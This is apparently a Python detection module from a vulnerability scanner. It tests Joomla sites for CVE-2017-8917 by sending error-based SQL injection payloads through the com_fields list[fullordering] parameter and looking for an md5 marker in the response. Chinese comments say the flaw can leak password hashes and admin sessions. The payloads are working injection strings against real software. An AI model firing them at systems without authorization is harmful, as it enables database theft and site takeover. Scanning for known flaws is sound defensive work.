#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_int_1

cve_2017_8917_payloads = [
    {'path': 'index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x7e,concat(0x7e,md5({RANDOMNUM})),0x7e)'},
    {'path': 'Joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x7e,concat(0x7e,md5({RANDOMNUM})),0x7e)'},
]

def cve_2017_8917_scan(clients):
    ''' 这个漏洞出现在3.7.0新引入的一个组件“com_fields”
            这个组件任何人都可以访问，无需登陆验证
            由于对请求数据过滤不严导致sql注入，sql注入对导致数据库中的敏感信息泄漏
                例如用户的密码hash以及登陆后的用户的session
                （如果是获取到登陆后管理员的session，那么整个网站的后台系统可能被控制）'''

    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Joomla',
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2017-8917',
    }
    
    for payload in cve_2017_8917_payloads:
        random_num = random_int_1()                # * 随机数字

        path = payload['path'].format(RANDOMNUM=random_num)

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        md = md5(str(random_num), 30)   # * 计算随机数字的md5值, 取30位(0-29), 因为报错注入的符号 会占用位置
        
        if (md in res.text):            # * 如果计算的md5值, 在响应包的回显中找到了, 说明SQL注入的md5()函数执行了, 存在漏洞
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
